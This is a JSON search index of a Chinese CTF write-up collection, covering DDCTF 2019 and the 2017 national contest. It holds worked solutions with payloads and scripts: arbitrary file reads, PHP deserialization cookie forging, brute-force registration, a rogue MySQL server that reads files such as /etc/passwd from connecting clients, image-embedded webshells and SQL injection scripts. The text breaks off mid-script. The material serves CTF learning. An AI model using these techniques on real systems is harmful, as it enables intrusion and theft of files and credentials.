{"./":{"url":"./","title":"介绍","keywords":"","body":"站点介绍 宗旨： 本站致力于收集各类CTF题的Writeup，以方便各位师傅们进行学习。 站长： ID：YunenEmail: yunen@cqu.edu.cn 感谢： 在此鸣谢对本站点提供帮助的朋友们(Issue、捐助、分享wp等)。 说明： 本站所有文章均来源与网上搜索查询，如果您有更好的Writeup想分享，欢迎email我的邮箱，如果损害了您的利益，请尽快联系我，确保在24小时之内进行删除。 "},"types/":{"url":"types/","title":"按类型区分","keywords":"","body":"按类型区分 按照赛题区分 类型 数量 网上练习题 1 官方赛事题 3 "},"types/web.html":{"url":"types/web.html","title":"网上练习题","keywords":"","body":"网上练习题 按照添加时间倒序排序 添加时间 名称 2019-04-15 实验吧web部分 "},"types/comp.html":{"url":"types/comp.html","title":"官方赛事题","keywords":"","body":"官方赛事题 按照添加时间倒序排序 添加时间 名称 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-16 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 "},"years/":{"url":"years/","title":"按年份区分","keywords":"","body":"按年份区分 将WP按年份区分可让我们更好的去猜测出题人的命题思路。 时间 数量 2019-2020 2 2018-2019 0 2017-2018 1 2016-2017 0 2015-2016 0 ????-2015 1 "},"years/2020.html":{"url":"years/2020.html","title":"2019-2020","keywords":"","body":"2019-2020 2019-2020的CTF 添加时间 名称 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-15 2019西湖论剑预选赛 "},"years/2019.html":{"url":"years/2019.html","title":"2018-2019","keywords":"","body":"2018-2019 2018-2019年的CTF 添加时间 名称 "},"years/2018.html":{"url":"years/2018.html","title":"2017-2018","keywords":"","body":"2017-2018 2017-2018年的CTF 添加时间 名称 2019-04-16 2017全国大学生信息安全竞赛 "},"years/2017.html":{"url":"years/2017.html","title":"2016-2017","keywords":"","body":"2016-2017 2016-2017年的CTF 添加时间 名称 "},"years/2016.html":{"url":"years/2016.html","title":"2015-2016","keywords":"","body":"2015-2016 "},"years/2015.html":{"url":"years/2015.html","title":"????-2015","keywords":"","body":"????-2015 未知年份及2015年(包含)之前的CTF 添加时间 名称 2019-04-15 实验吧web部分 "},"difficult/":{"url":"difficult/","title":"按难度区分","keywords":"","body":"按难度区分 按照难度区分，更方便不同层次的师傅学习 难度 数量 较易 1 中等 3 较难 0 "},"difficult/easy.html":{"url":"difficult/easy.html","title":"相对简单","keywords":"","body":"相对简单 按照添加时间倒序排序 添加时间 名称 2019-04-15 实验吧web部分 "},"difficult/mid.html":{"url":"difficult/mid.html","title":"难度中等","keywords":"","body":"难度中等 按照添加时间倒序排序 添加时间 名称 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-15 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 "},"difficult/diff.html":{"url":"difficult/diff.html","title":"难度较大","keywords":"","body":"难度较大 "},"articals/all.html":{"url":"articals/all.html","title":"目前已收录","keywords":"","body":"目前已收录 时间按照新旧排序，欢迎提交好的Writeup 时间 名称 2019-04-16 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 2019-04-15 实验吧web部分 "},"articals/2019ddctf.html":{"url":"articals/2019ddctf.html","title":"2019DDCTF","keywords":"","body":"2019DDCTF滴滴高校闯关赛 本题已开通评论，欢迎在页面最下方留言吐槽。 题目类型： 类型 年份 难度 官方赛事题 2019 中 网上公开WP： http://12end.xyz/ddctf-writeup/ http://yuufeng.com/ https://blog.csdn.net/m0_37809075/article/details/89280350 https://www.xmsec.cc/p/4891b1d2-1166-4553-951c-d46cbac95af3/ 本站备份WP： 感谢作者：Yunen、12end、admin-琴里 WEB 滴~ 本题作者：Yunen 题目地址：http://117.51.150.246/打开题目：发现页面进行了一次调整，跳转后的url：http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09猜测jpg参数的值为base64编码后的内容，解码内容如下：NjY2QzYxNjcyRTZBNzA2Nw==明显的base64编码，再进行一次解码：666C61672E6A7067观察数据，发现两两一组时，字母全在数字后，且范围在[A-F]之内，猜测为HEX，将其转换为Ascii试试：flag.jpg明显的任意文件读取漏洞，尝试读取index.php将index.php其转换成HEX，再两次转Base64得：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3替换原来的jpg值访问：红框部分即为index.php的base64编码过的内容，复制下来解码得： '.$_GET['jpg'].''; $file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file); echo $file.''; $file = str_replace(\"config\",\"!\", $file); echo $file.''; $txt = base64_encode(file_get_contents($file)); echo \"\"; /* * Can you find the flag file? * */ ?> 题目提示了一个url，还有一个日期(2018-7-4)。 打开提示文章，发现该文章发表时间与提示时间不同。打开作者首页，找到2018-7-4发表的文章：https://blog.csdn.net/FengBanLiuYun/article/details/80913909这里有个巨大脑洞！！写这题的时候真想杀了出题人猜测存在备份文件practice.txt.swp，访问之~:提示flag存在于f1ag!ddctf.php文件，使用index.php读取之~由于$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);，我们无法直接输入!不过由于$file = str_replace(\"config\",\"!\", $file);，我们可以使用config来代替。故payload为:117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==返回内容base64解码： 简单的变量覆盖题，extract($_GET);会将GET内容转换成变量。file_get_contents($k)使用php://input将会返回post的数据getflag:flag: DDCTF{436f6e6772617******174696f6e73} Web签到题 打开题目，提示不是管理员权限，观察请求header，发现字段：didictf_username的值为空burp拦截数据包修改为admin，返回内容：您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php访问app/fL2XID2i0Cdh.php得源码： url:app/Application.php Class Application { var $path = ''; public function response($data, $errMsg = 'success') { $ret = ['errMsg' => $errMsg, 'data' => $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; } public function auth() { $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) { $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; }else{ $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path; } public function __destruct() { if(empty($this->path)) { exit(); }else{ $path = $this->sanitizepath($this->path); if(strlen($path) !== 18) { exit(); } $this->response($data=file_get_contents($path),'Congratulations'); } exit(); } } url:app/Session.php include 'Application.php'; class Session extends Application { //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() { if(parent::auth()) { $this->get_key(); if($this->session_read()) { $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); }else{ $this->session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); } } } private function get_key() { //eancrykey and flag under the folder $this->eancrykey = file_get_contents('../config/key.txt'); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this->cookie_name]; if(!isset($session)) { parent::response(\"session not found\",'error'); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this->eancrykey.$session)) { parent::response(\"the cookie data not match\",'error'); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){ return FALSE; } if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) { parent::response('the ip addree not match'.'error'); return FALSE; } if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) { parent::response('the user agent not match','error'); return FALSE; } return TRUE; } private function session_create() { $sessionid = ''; while(strlen($sessionid) md5(uniqid($sessionid,TRUE)), 'ip_address' => $_SERVER['REMOTE_ADDR'], 'user_agent' => $_SERVER['HTTP_USER_AGENT'], 'user_data' => '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata); $expire = $this->cookie_expiration + time(); setcookie( $this->cookie_name, $cookiedata, $expire, $this->cookie_path, $this->cookie_domain, $this->cookie_secure ); } } $ddctf = new Session(); $ddctf->index(); 这里我才有回溯的方法，先确定flag可能的输出点在构造满足条件的payload。在private function get_key()函数里提示到flag与eanccrykey在同一个文件夹，猜测flag内容在../config/flag.txt里。通读代码，可以发现唯一可能的flag输出点在public function __destruct()，这是Application类的析构函数，退出时会自动执行里边的代码，结合下边的serialize与unserialize易知此题考的是php反序列化。而我们发现，如果我们直接对cookie进行修改是不行，这是因为服务端使用key进行了加密验证处理，如果我们能拿到key的内容，那么变可以轻易绕过。 if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } 我们注意到此处函数涉及到key值的操作，其中sprintf为占位符替换函数。如果我们post的nickname值里存在%s 那么key值也会随着输出。先获得cookie值，记得header头加上didictf_username: admin将cookie替换，post内容:nickname=a---%s得到key:EzblrbNS，至此大工告成。理清下思路： 1.新建Application类，修改path变量为..././config/flag.txt(../进行过一次过滤) 2.将类加入$userdata数组进行序列化处理 3.返回key加密后的cookie 4.getflag 本地搭建php环境： 将以下源码复制访问 即可生成序列化数据： $errMsg, 'data' => $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; } public function auth() { return true; } private function sanitizepath($path) { $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path; } public function __destruct() { $this->response($this->user_agent); if(empty($this->path)) { $this->response(\"error111\"); exit(); }else{ $path = $this->sanitizepath($this->path); if(strlen($path) !== 18) { exit(); } $this->response($data=file_get_contents($path),'Congratulations'); } exit(); } } class Session extends Application { //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() { if(parent::auth()) { $this->get_key(); if($this->session_read()) { $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); }else{ $this->session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); } } } private function get_key() { //eancrykey and flag under the folder $this->eancrykey = 'EzblrbNS'; } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this->cookie_name]; if(!isset($session)) { parent::response(\"session not found\",'error'); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this->eancrykey.$session)) { parent::response(\"the cookie data not match\",'error'); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){ return FALSE; } if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) { return true; } if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) { parent::response('the user agent not match','error'); return FALSE; } return TRUE; } private function session_create() { $sessionid = ''; while(strlen($sessionid) path = '..././config/flag.txt'; //修改类中变量path $userdata = array( $a, //序列化 'session_id' => md5(uniqid($sessionid,TRUE)), 'ip_address' => $_SERVER['REMOTE_ADDR'], 'user_agent' => $_SERVER['HTTP_USER_AGENT'], 'user_data' => '', ); $cookiedata = serialize($userdata); parent::response($cookiedata); $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata); $expire = $this->cookie_expiration + time(); setcookie( $this->cookie_name, $cookiedata, $expire, $this->cookie_path, $this->cookie_domain, $this->cookie_secure ); } } $ddctf = new Session(); $ddctf->index();?> 生成数据： a:5:{i:0;O:11:\"Application\":1:{s:4:\"path\";s:21:\"..././config/flag.txt\";}s:10:\"session_id\";s:32:\"d31fd78332ef2737d3c007915d643d86\";s:10:\"ip_address\";s:13:\"192.168.246.1\";s:10:\"user_agent\";s:115:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\";s:9:\"user_data\";s:0:\"\";} 注意此处的数据由于UA头不同，请自己生成。记得加上key进行md5加密： import hashlib str = 'EzblrbNS'+'a:5:{i:0;O:11:\"Application\":1:{s:4:\"path\";s:21:\"..././config/flag.txt\";}s:10:\"session_id\";s:32:\"d31fd78332ef2737d3c007915d643d86\";s:10:\"ip_address\";s:13:\"192.168.246.1\";s:10:\"user_agent\";s:115:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\";s:9:\"user_data\";s:0:\"\";}' print(hashlib.md5(str.encode('utf8')).hexdigest()) 得到hash:3c27da16d59c7edbacbf41a5cea391c3修改数据包重放：记得先url编码哟~flag: DCTF{ddctf2019_*****_pHVlHIDDGdV8qA2j} 大吉大利，今晚吃鸡~ 本文作者：12end进去注册，登录后只有100金币，但是吃鸡的ticket需要2000金币，需要想办法绕过去。 购买ticket 截取添加订单的请求，发现是一个简单的get请求，且ticket_price是可控的：经尝试发现，这个tickiet_price只可以修改地比2000大，且只能含有数字，那么我们只能考虑整数溢出了。在32位系统下，所有无符号整数的数量是2^32=4294967296，去掉0这个数的话，最大整数便是4294967295，当我们令一个数等于2^32时，它便会溢出为0。我们这里传入4294967297,虽然订单页面显示的还是如此，但实际支付订单时，它才产生了溢出，初步认为他是以字符串存入，在运算时再转换为整型（可能并不准确），最后只花了1金币购买：进到游戏之后，可以通过提交正确id与ticket来移除对手，没什么好办法，经过一番尝试了解到id与ticket是固定对应的关系，只有写脚本通过暴力注册获取尽可能多的id，然后一一删除了。 tips:剩余对手的100人中，id是任意的，你并不能保证只需要注册100次就可以删掉全部的对手，最有效的办法是注册一次删除一次。 因篇幅原因，抓取api请求，并编写脚本的过程便不再赘述，脚本注释已较为详尽，使用时修改参数即可，唯一缺憾是代码健壮性欠佳，遇到网络问题时不能处理错误造成崩溃，但代码作用是可续的，所以问题不大，重启脚本就可以继续了 import requests import time regist = \"http://117.51.147.155:5050/ctf/api/register?password=11111111&name=\"#name添加一个前缀 buy_ticket = \"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296\" pay_ticket = \"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=\" delete = \"http://117.51.147.155:5050/ctf/api/remove_robot\" get_flag=\"http://117.51.147.155:5050/ctf/api/get_flag\" i= 55555 #初始化用户名,使用未注册过的数字 def delete_robot(player_id, player_ticket): COOKIE = {\"Cookie\": \"user_name=; REVEL_SESSION=\"} #修改为自己主账户的cookie param={\"id\":player_id,\"ticket\":player_ticket} requests.get(delete,params=param, headers=COOKIE) #删除id flag = requests.get(get_flag, headers=COOKIE) #获取剩余的敌人数量 print(flag.text ) while True: t = requests.session() i+=1 r = t.get(regist + str(i)) #注册 r = t.get(buy_ticket).json() #购买Ticket，解析json bill_id = r[\"data\"][0][\"bill_id\"] #json解析bill_id r = t.get(pay_ticket + bill_id).json() #支付订单 player_id = r[\"data\"][0][\"your_id\"] player_ticket = r[\"data\"][0][\"your_ticket\"] #json解析id与ticket delete_robot(player_id,player_ticket) #使用主账户删除id time.sleep(0.3) #短暂休眠避免被封 homebrew event loop 作者：12end直接审计源码对于本题的字串切割函数get_mid_str请自行理解，如果不明白这个函数的话，下面的payload将难以理解原理。首先，eval的那部分由于分割不当可以通过注释符导致代码执行，我们可以构造?action:show_flag_function%23;请求来执行一个（没卵用的函数）:能够执行，就该思考怎么进一步利用以获取flag不难看出，本题靠队列控制函数的执行流程，且唯一获取flag的函数被ban掉了返回值: def show_flag_function(args): #被ban的输出flag函数，没有return flag flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return 'You naughty boy! ;) ' 仔细观察代码，我们发现还可以从两个地方获取flag： 1.直接执行FLAG() 2.执行get_flag_handler会通过trigger_event('func:show_flag;' + FLAG())将flag的值入队 我最开始想到的方法便是直接执行FLAG()，在flask中，视图函数的返回值会被传输到前端以供展示，这道题的视图函数entry_point的返回值是execute_event_loop(),而execute_event_loop的返回值resp是由事件循环中执行函数的返回值ret_val决定的，这也就是我们直接执行show_flag_function函数会将返回值打印在前端的原因。以此推出，如果能直接执行FLAG()，flag也会被打印出来。到此为止似乎一帆风顺，我们把上面的请求稍作修改不就可以拿flag了吗？实际测试却404了。 404的原因在这里： try: event_handler = eval(action + ('_handler' if is_action else '_function')) #eval造成的代码执行，从这里下手 ret_val = event_handler(args) #获取返回值 可以看到第三行的执行函数是带有参数的，而我们试图向一个不需要参数的函数传参时，python会抛出参数过多的错误，try失败后就会导致404。思考了很久也没有想出能够绕过这里的地方，如果绕过去了，这应当是一个非预期解。 经@Smi1e师傅的指导，知道这道题要利用flask的客户端session导致的安全问题。相关文章：客户端 session 导致的安全问题好巧不巧，题中的执行队列恰巧是存储在session中的。那么，我们只需要利用上面提到的第二点来将flag值入队，解密此时的session即可。payload:?action:trigger_event%23;action:buy;5%23action:get_flag; mysql弱口令 作者：12end提示先部署agent.py再进行弱口令扫描 在agent.py的响应函数中，返回了result的响应内容，result的值来源于_func函数： class RequestHandler(BaseHTTPRequestHandler): def do_GET(self): .... ... result = self._func() self.wfile.write(json.dumps(result)) 研究一下_func()： def _func(self): netstat = Popen(['netstat', '-tlnp'], stdout=PIPE) //执行netstat子进程，获取在监听的tcp服务程序名等信息并输入至pipe netstat.wait() //等待子进程结束 ps_list = netstat.stdout.readlines() //逐行读取 result = [] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = { 'local_address': Local_Address, 'Process_name': Process_name } result.append(tmp_dic) //向result中增加字典元素，包含着进程的源地址及进程名称 return result 可以看出整个程序的作用就是返回tcp服务进程的相关信息，猜测题目的服务器（下称靶机）是以此判断mysql是否在目标服务器（下称客户机）上运行。 尝试一番，当我们未在客户机上运行agent.py时，会提示： 而此时，我们客户机的Mysql是开启着的。 同样，将客户机的Mysql关闭，agent.py运行，会提示未扫描到弱密码。mysql的进程名称是mysqld，我们直接修改self.wfile.write(json.dumps(result))为mysqld可以成功绕过服务器的判断。 绕过了，然后呢？祭出我@Smi1e师傅的一篇blog：MySQL LOAD DATA 读取客户端任意文件 大意是指,主机A连接远程mysql服务器主机B的过程中，所有请求都是明文传输，而我们可以在主机B上伪造任意内容发送给主机A。 而在MySQL中，LOAD DATA LOCAL INFLIE语句会将本地内容传输给远端服务器，下面是执行LOAD DATA LOCAT INFILE的过程： 本地向远端服务器发起请求包，请求包含要传输的文件路径-> 远端服务器对请求进行响应，响应内容为请求包中的文件路径-> 本地发送响应包中的文件内容 如果我们可以伪造响应的任意内容，也就意味着能够读取到连接者本地的任意文件 最重要的是伪造的服务端可以在任何时候回复一个file-transfer 请求，不一定非要是在客户端发送LOAD DATA LOCAL数据包的时候。（前提是客户端已经请求了任意内容，幸运的时，绝大多数客户端都会在连接mysql成功时发送一系列类似@@version的初始化请求） 不过如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES即(Can use LOAD DATA LOCAL)属性。如果没有的话，就要在连接mysql的时候加上--enable-local-infile。 回归正题，为了与靶机建立连接，我们就需要让靶机认为已经连接上了我们的数据库，我们只需向其响应greeting以及authok的数据包即可，然后再发送精心构造好的数据包，让靶机把我们想要的文件给响应过来在github上已有相关的项目以部署这样的恶意mysql服务器：Rogue-MySql-Server在这里以python的脚本为例： 修改26行的filelist为我们想要读取的文件路径，假设为’/etc/passwd’，先开启agent.py欺骗靶机，告诉它我们已经开启了mysqld进程，再开启这个poc.py，然后让靶机扫描一下我们的客户机： 最后的文件信息会在当前目录下的mysql.log：root用户的mysql操作一般记录在：~/.mysql_history中，读取一下就可以拿到flag UploadIMG 作者：admin-琴里 看着是一个简单的上传题，但做起来以后根本就不是那么一回事！ 尝试上穿图片:哦，（心情复杂QAQ） 然后，我将传上去的文件下载下来以后，用Hex编辑器查看。 发现开头是 php-gd 会带着 libjpeg 转换。 经过无数次的修改图片。。传图片。。比较图片，最后的出: 往里面相同的部分替换 “phpinfo()” (9字节) 而不断的向fuzz插入的位置，是可以的！最后上传图片，得flag 这个题的原理就是改二次渲染后的图片的马 脚本里有一个参数是马的内容 然后就是写入马 那个脚本就是在二次渲染后的图片中加入马 然后就可以拿到flag了 Reverse 作者：admin-琴里 Cofused 这个文件下载下来是app的安装包然后再安装包里发现了一个叫xia0Crackme文件然后我们拖到IDA里面查找字符串交叉引用来到关键函数函数都标有注释（震惊！出题人果然是一个良好的大佬）程序验证了前六位是不是”DDCTF{“以是不是”}”然后把中间的字符串当做参数传到sub_1000011D0函数里如果这个函数的返回值等于1的话这个flag则正确 然后sub_1000011D0函数中首先是初始化了一个区域：v2Sub_100001f60是通过输入的字符串和内存数据对v2进行赋值操作前段是对v2进行赋值，最后将输入的字符串拷贝到qword_100003F58+48的位置 sub_100001F00函数对(*v2+24)进行赋值把一段数据赋给了他，然后是一个循环判断条件就是刚刚赋值的数据是不是等于“0xf3” 然后我们进入sub_100001E50这个函数是控制程序执行的vm的分支 跳转的分支就是刚刚给v2赋值的函数地址 sub_100001D70：相当于给一个寄存器赋值的操作然后sub_100001A60：异或操作ub_100001AA0：对操作后的字符和输入的字符进行比较sub_100001CB0：加操作sub_100001CF0：减操作sub_100001B10:设置判断是否正确标志位sub_100001D30：赋值操作 sub_100001C60：对内存中的数据进行操作两种运算:A～Z和a～z具体数据： 0xf0,0x10,0x66,0x0,0x0,0x0, 0xf8, 0xf2,0x30, 0xf6,0xc1, 0xf0,0x10,0x63,0x0,0x0,0x0, 0xf8, 0xf2,0x31, 0xf6,0xb6, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x32, 0xf6,0xab, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x33, 0xf6,0xa0, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x34, 0xf6,0x95, 0xf0,0x10,0x57,0x0,0x0,0x0, 0xf8, 0xf2,0x35, 0xf6,0x8a, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x36, 0xf6,0x7f, 0xf0,0x10,0x73,0x0,0x0,0x0, 0xf8, 0xf2,0x37, 0xf6,0x74, 0xf0,0x10,0x45,0x0,0x0,0x0, 0xf8, 0xf2,0x38, 0xf6,0x69, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x39, 0xf6,0x5e, 0xf0,0x10,0x72,0x0,0x0,0x0, 0xf8, 0xf2,0x3a, 0xf6,0x53, 0xf0,0x10,0x52,0x0,0x0,0x0, 0xf8, 0xf2,0x3b, 0xf6,0x48, 0xf0,0x10,0x66,0x0,0x0,0x0, 0xf8, 0xf2,0x3c, 0xf6,0x3d, 0xf0,0x10,0x63,0x0,0x0,0x0, 0xf8, 0xf2,0x3d, 0xf6,0x32, 0xf0,0x10,0x44,0x0,0x0,0x0, 0xf8, 0xf2,0x3e, 0xf6,0x27, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x3f, 0xf6,0x1c, 0xf0,0x10,0x79,0x0,0x0,0x0, 0xf8, 0xf2,0x40, 0xf6,0x11, 0xf0,0x10,0x65,0x0,0x0,0x0, 0xf8, 0xf2,0x41, 0xf6,0x6, 0xf7,0x1,0x0,0x0,0x0,0xf3 最后可以得到flag：hello******TheFlag DDCTF{hello******TheFlag}(PS:题目作者真是一名优秀的程序员) 评论区 请文明评论，禁止广告 "},"articals/2017national.html":{"url":"articals/2017national.html","title":"2017全国信安赛","keywords":"","body":"2017全国大学生信息安全竞赛 题目类型： 类型 年份 难度 官方赛事题 2017 中 网上公开WP: https://www.anquanke.com/post/id/86431 https://p0sec.net/index.php/archives/107/ https://blog.csdn.net/csu_vc/article/details/78011716 https://blog.csdn.net/aptx4869_li/article/details/80589250 题目下载： 暂无 本站备份WP： 作者：FlappyPig web 一.PHP execise 类型：WEB 分值：150分直接就能执行代码，先执行phpinfo(),发现禁用了如下函数 assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm, pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled, pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch, pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait, pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,file_get_contents,fread,file_get_contents, file,readfile,opendir,readdir,closedir,rewinddir, 然后通过foreach (glob(\"./*\") as $filename) { echo $filename.\"\"; } glob()函数经常用于disable_function()的绕过，该函数的作用是返回匹配指定模式的文件名或目录。 该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。 列出当前目录，然后再用highlight_file()函数读取flag文件内容即可 此处还可用shou_source函数 web 250 首先通过svn泄露获取到源码，然后观察发现主要部分在login.php这里 11){ echo(\"alert('name too long')\"); }else{ $sql = \"select count(*) from t_info where username = '$name' or nickname = '$name'\"; echo $sql; $result = mysql_query($sql); $row = mysql_fetch_array($result); if ($row[0]){ $_SESSION['hat'] = 'black'; echo 'good job'; }else{ $_SESSION['hat'] = 'green'; } header(\"Location: index.php\"); } } 由index.php中代码: 当$_SESSION['hat'] = 'black';时，在index.php下面就能获取到flag， 但是我们注册时候插入的表是t_user，而这里登陆查询的表是t_info,所以思路就只有想办法在login这里注入，结合login.php分析可知，在login.php中，第5行，但会结果不为空，即可。 因此构造poc 最后构造的payload如下： name=or%0a1=1%0a#'&submit=check 成功获取到flag为flag{good_job_white_hat} 8.Classical 类型：web 分值：300分 题目类似WCTF某原题。 加密代码生成了超递增的sk后，使用sk * mask % N作为pk进行使用。flag被用于选取pk求和得到sum。 是典型的Knapsack problem，使用Shamir Attack进行攻击。在github上有很多此类加密方案的攻击办法： https://github.com/taniayu/merklehellman-lll-attack https://github.com/kutio/liblll https://github.com/sonickun/ctf-crypto-writeups/tree/4c0841a344bc6ce64726bdff4616fe771eb69d1e/2015/plaid-ctf/lazy 攻击方法为首先构造矩阵，通过lllattack求得新的矩阵，选取最短的向量即可。 c=956576997571830839619219661891070912231751993511506911202000405564746186955706649863934091672487787498081924933879394165075076706512215856854965975765348320274158673706628857968616084896877423278655939177482064298058099263751625304436920987759782349778415208126371993933473051046236906772779806230925293741699798906569 pubkey=[（自己去复制吧）] from Crypto.Util.number import long_to_bytes as l2b def create_matrix(pub, c): n = len(pub) i = matrix.identity(n) * 2 last_col = [-1] * n first_row = [] for p in pub: first_row.append(int(long(p))) first_row.append(-c) m = matrix(ZZ, 1, n+1, first_row) bottom = i.augment(matrix(ZZ, n, 1, last_col)) m = m.stack(bottom) return m def is_target_value(V): for v in V: if v!=-1 and v!=1: return False return True def find_shortest_vector(matrix): for col in matrix.columns(): if col[0] == 0 and is_target_value(col[1:]): return col else: continue pub = pubkey c = c m = create_matrix(pub, c) lllm = m.transpose().LLL().transpose() shortest_vector = find_shortest_vector(lllm) print shortest_vector x = \"\" for v in shortest_vector[1:]: if v == 1: x += \"1\" elif v == -1: x += \"0\" print x print hex(int(x,2))[2:-1].decode(\"hex\") #flag{M3k13_he11M4N_1ik3s_1Att1ce} 10.flag bending machine 类型：WEB 分值：300分 进去是一个注册及登陆，经过一番fuzz，认为最有可能是二次注入 例如我注册一个bendawang' or 1=1#和注册一个bendawang' or 1=0#，猜想在查询余额时的语句为 select xxx from xxx where username=bendawang' or 1=1# select xxx from xxx where username=bendawang' or 1=0# 所以很容易知道，如果是第一种情况，后面的or 1=1恒真，也就是查询的结果是整个表的结果，而第二个则是用户名为bendawang的结果，也就是说，猜想查询多个结果时取第一个的话，如果我购买了东西，也就是第一种情况显示的余额是不变的，而第二种情况是会变的。就可以根据这个点来进行二分盲注。 另外需要注意的是，题目过滤了一些关键字，select ,from ,on等，不过可以双写绕过，其中on是最坑的，这是最开始测试union是否被过滤发现的。都可以通过双写就能绕过了。 其它也就没有什么过滤了。 最后爆破出来的表名fff1ag，列名thisi5f14g 爆破flag的脚本如下： import requests import string import random import time import re #fff1ag #thisi5f14g url='http://106.75.107.53:8888/' chars=string.printable[:62]+\"!@#$%^&*()_+-={}\" header = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'keep-alive' } def register(data): result = requests.post(url+\"register.php\",data=data,headers=header) if \"Register success\" in result.content: return True else: return False def check(data): data=data.replace('on','') #print data r=requests.session() content=r.post(url+\"login.php\",data=data,headers=header).content #print content if \"wrong\" in content: raw_input(\"error!!!!!!!!!!!!!!!!!!!!!!\"); balance=int(re.findall('you balance is (.*?)',content)[0]) #print \"balance1:\"+str(balance) r.get(url+'buy.php?id=1') 